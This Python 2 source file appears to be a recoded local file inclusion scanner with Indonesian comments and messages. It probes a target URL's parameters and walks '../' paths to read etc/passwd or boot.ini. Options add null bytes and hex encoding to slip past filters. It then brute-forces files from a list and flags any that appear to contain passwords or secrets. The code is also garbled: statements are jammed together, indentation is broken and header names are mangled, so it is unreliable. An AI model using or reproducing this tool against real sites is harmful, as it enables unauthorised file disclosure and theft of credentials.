## senggol.py - LFI Scanener - recoded by Tukang Sapu
## tanpa proxy: $ python senggol.py -t "http://sasaran/lfi.php?id=beranda.txt&module=beranda" -o laporan.html
## dengan proxy: $ python senggol.py -t "http://sasaran/lfi.php?id=beranda.txt&module=beranda" -w http://proxy:8080 -o laporan.html
## Encoding dalam hexa : $ python senggol.py -t "http://sasaran/lfi.php?id=beranda.txt&module=beranda" -x 
## Kirim nol byte: $ python senggol.py -t "http://sasaran/lfi.php?id=beranda.txt&module=beranda" -n 

import datetime
import time
import urllib2
import getopt
import sys
import re
import base64
from urlparse import urlparse
from optparse import OptionParser


def autodetect (url, us, pw, prox):	url= str(url) 	url = urlparse (url) params = dict([part.split('=') for part in url[4].split('&')])	coun =0	count =0
        if prox <> '':
                proxy_support = urllib2.ProxyHandler({"http":prox})
                opener = urllib2.build_opener(proxy_support)
                urllib2.install_opener(opener)

	while coun <= count: count=0 site=url[0]+'://'+url[1]+url[2]+'?'
        	for tuple in params.items(): count= count+1
                	if coun == count: site=site+tuple[0]+'='+'test'+'&'
                	else: site=site+tuple[0]+'='+tuple[1]+'&' coun= coun+1	x = urllib2.Request(site)
		if us <> '':
                	   base64string = base64.encodestring('%s:%s' % (us, pw))[:-1]
                  	   authheader =  "Basis %s" % base64string
                   	   x.add_header("Otentifikasi", authheader)
           		   try: handle = urllib2.urlopen(x)
      			   except IOError, e:   print "Pengguna atau kata sandi salah."  sys.exit(1)
		 
		handle = urllib2.urlopen(x)
		reply = handle.read()
		filtra = reply.find("'cek' untuk dimasukan");
	       	if filtra <> -1: print ' lfi terdeteksi di '+'"'+tuple[0]+'"'+' parameter' site= site.split('test') return site
			break
			handle.close;
	exit(1)
	handle.close;

def hexaenc (url): encoded =''	for char in url:  encoded= encoded+"%"+hex(ord(char))[2:]	return encoded

def usage(argv):
    print 'Ketik url dengan lokal termasuk sebagai yang menunjukkan di bawah';
    print 'Contoh: python '+argv+' -t http://sasaran/target.php?id=[LFI DISINI]';
    print "Cara menggunakan :"
    print "--target, -t http://sasaran/target.php?id=[LFI DISINI]"
    print "--null, -n Pasang byte nol untuk memotong beberapa kontrol"
	print "--user, -u Digunakan untuk mengirim username pada otentikasi dasar"
	print "--passw, -p Digunakan untuk mengirim password otentikasi dasar"
	print "--proxy, -w Dukungan Proxy"
	print "--output, -o Mengatur file output"
	print "--hexa, -x encode url untuk hexa"

def detroot (urlt, us, pw, prox, out_f): count = 0
	print '--------------------------------------------------------------------'
	print 'Mendeteksi jalur root situs';
	print '--------------------------------------------------------------------'
	print ''
	print ''
	if prox <> '':	proxy_support = urllib2.ProxyHandler({"http":prox}) opener = urllib2.build_opener(proxy_support) urllib2.install_opener(opener)
       	while True: print 'Menurun '+str(count)+' folder' path= '../'*count
	   if hexa == '1':  pathtstln = hexaenc (path+'etc/passwd')   roodet = urlt[0]+pathtstln+urlt[1]+nul;
		else: roodet= urlt[0]+path+'etc/passwd'+urlt[1]+nul;  p = urllib2.Request(roodet)
	   try:
	   	
		if us <> '': base64string = base64.encodestring('%s:%s' % (us, pw))[:-1] authheader =  "Basic %s" % base64string p.add_header("Otentifikasi", authheader)
		try: handle = urllib2.urlopen(p)
		except IOError, e:
   
    			print "Pengguna atau kata sandi salah."	sys.exit(1)	reply = handle.read()

 	   except IOError, e:
	    	   if hasattr(e, 'code'):
        		if e.code == 401:
				print "root ditemukan di: "
                       		print '-------------------------------------------------------------'
                        	print urlt[0]+path+urlt[1]
                        	print " Root dari sistem file ditemukan "+str(count)+" Level menurun"
                        	print " Tidak ada hak pengguna"
				print " Ini adalah Sistem Linux"
                 		print '-------------------------------------------------------------'
                 		os = 'lnx'	now = datetime.datetime.now()
        			if out_f <> '':	out_file = open(out_f,"a")	out_file.write ('<html>') out_file.write ('<head>')	out_file.write ('<title>Laporan LFI </title>')	out_file.write ('</head>') out_file.write ('<body>') out_file.write (str(now))	out_file.write("\n")  out_file.write("Ini adalah Sistem Linux \n") out_file.close()
				return path, os                		
                 		break

	   count = count + 1   filtra = reply.find('0:root');
	   
	   if filtra <> -1:
     		 print "root ditemukan di: "
     		 print '-------------------------------------------------------------'
      		 print urlt[0]+path+urlt[1]
      		 print " Root dari sistem file ditemukan "+str(count)+" level menurun"
		 print " Ini adalah Sistem Linux"
      		 print '-------------------------------------------------------------'
                 now = datetime.datetime.now()
                 print now
		 os = 'lnx'
         	 if out_f <> '':	out_file = open(out_f,"a") 	out_file.write (str(now)) 	out_file.write("\n") out_file.write("Ini adalah Sistem Linux \n") 	out_file.close()
      		   return path, os 
		 break
	   else: handle.close;
     		 if count > 10:

			print "--------------------------------------------------------"
			print " Mencoba menjalankan di windows "
			print "--------------------------------------------------------"
			count = 0
	     		while True:
				
 	      		 	print 'Menurun '+str(count)+' folder' 	path= '../'*count
				if hexa == '1':	 pathtstln = hexaenc (path+'boot.ini') roodet = urlt[0]+pathtstln+url[1]+nul;
					else: roodet= urlt[0]+path+'boot.ini'+urlt[1]+nul;	p = urllib2.Request(roodet)

				if us <> '': base64string = base64.encodestring('%s:%s' % (us, pw))[:-1] authheader =  "Basic %s" % base64string p.add_header("Otentifikasi", authheader)
                		try: handle = urllib2.urlopen(p)
                		except IOError, e:
                        		print "pengguna atau kata sandi salah."  sys.exit(1)  reply = handle.read() count = count + 1 filtra = reply.find('loader');
			        
				if filtra <> -1:
                			 print "root ditemukan di: "
                			 print '-------------------------------------------------------------'
                 			 print url+path
             				 print " Root dari sistem file ditemukan "+str(count-1)+" level menurun "
                 			 print " Ini adalah sistem Windows" 
					 print '-------------------------------------------------------------'
                 			 now = datetime.datetime.now()
                                         print now
					 os = 'win'
					 if out_f <> '': out_file = open(out_f,"a") out_file.write (str(now)) out_file.write("\n")	out_file.write("Ini adalah sistem Windows \n")  out_file.close()
					  return path, os
                 			 break
           			else:  handle.close;
                 		 	if count > 10: print 'path tidak ditemukan' sys.exit(0)
 
def brute (urlt, path, os, us, pw, prox, out_f, cusre):
		
	if os == 'lnx':	f = open("lin.dat","r");
	if os == 'win':	f = open("win.dat","r");
	if out_f <> '':	out_file = open(out_f,"a") out_file.write("\n")
	if prox <> '': proxy_support = urllib2.ProxyHandler({"http":prox})	opener = urllib2.build_opener(proxy_support) urllib2.install_opener(opener)

	while True: testline = f.readline().rstrip()
  	   if hexa == '1': pathtstln = hexaenc (path+testline) site = urlt[0]+pathtstln+urlt[1]+nul;
	   else: site = urlt[0]+path+testline+urlt[1]+nul;  g = urllib2.Request(site)
	   if us <> '':	   base64string = base64.encodestring('%s:%s' % (us, pw))[:-1] authheader =  "Basic %s" % base64string    g.add_header("Otentifikasi", authheader)
           try:
               	handle = urllib2.urlopen(g)
           except IOError, e:
                print "Katasandi atau pengguna salah." sys.exit(1)
              	   
       	   reply = handle.read()
	   
	   if cusre <> '':	respuesta= cusre
	   else: respuesta= "'"+path+testline+"'"  filtra2 = reply.find(respuesta);  word_list = ["password", "community", "secret"]
	   	   	   	   	      	   	   
	   if filtra2 == -1:
      			print "File ditemukan: "
			if out_f <> '':	
   	        		out_file.write("========================================================================\n")
     				out_file.write('<a href='+site+'>'+urlt[0]+path+testline+urlt[1]+'</a><br>')
				out_file.write("\n")

			t = [(word, reply.find(word)) for word in word_list]				

			print site
			for i in range(len(t)):	b2 = -1 in t[i]
     		
				if str(b2) <> 'True':
					if out_f <> '':	out_file.write("Kemungkinan terdeteksi dalam file ini kata sandi!\n")	
					print ("Kemungkinan terdeteksi dalam file ini kata sandi")
					break
								
      			print '=============================================================='
   	        	handle.close;
   	   if len(testline) == 0:
       		 break
  	         if out_f <> '': out_file.write('</body>') out_file.write('</html>')  out_file.close()

		 return

parser = OptionParser()
parser.add_option("-t", "--target", help="Url untuk memindai", dest="id")
parser.add_option("-n", "--null", help="Pasang byte nol untuk memotong beberapa kontrol",action="store_const", const=1, dest="sisip")
parser.add_option("-u", "--user", help="Berikan nama pengguna yang valid untuk tools ", dest="pengguna")
parser.add_option("-p", "--pass", help="Memberikan password yang valid untuk tools", dest="kunci")
parser.add_option("-w", "--proxy", help=" Gunakan Proxy : http://proxy:8080", dest="proxyz")
parser.add_option("-o", "--output", help=" Digunakan untuk mengatur file output", dest="salin")
parser.add_option("-x", "--hexa", help=" Digunakan untuk mengkodekan setiap permintaan untuk hexa ",action="store_const", const=1, dest="hexabt")
parser.add_option("-c", "--customrep", help=" Pilihan ini digunakan untuk mengatur apa yang Anda butuhkan untuk membantu mendeteksi aplikasi untuk melakukan pekerjaan-Nya", dest="pengecekan")
(options, args) = parser.parse_args()

if options.id:  url = options.id
else: usage (sys.argv[0]) sys.exit(0) 
if options.sisip == 1:  nul ='%00'
else:  nul =''
if options.pengecekan: cusre=options.pengecekan
else:cusre=''
if options.hexabt == 1: hexa ='1'
else: hexa =''
if options.salin: out_f= options.salin
else:  out_f= ''
if options.pengguna:    us= options.pengguna
else: us= ''
if options.kunci:  pw= options.kunci
else:   pw=''
if options.proxyz: prox= options.proxyz
else:  prox=''
urlt= autodetect (url, us, pw, prox) path, os = detroot (urlt, us, pw, prox, out_f) brute (urlt, path, os, us, pw, prox, out_f, cusre)
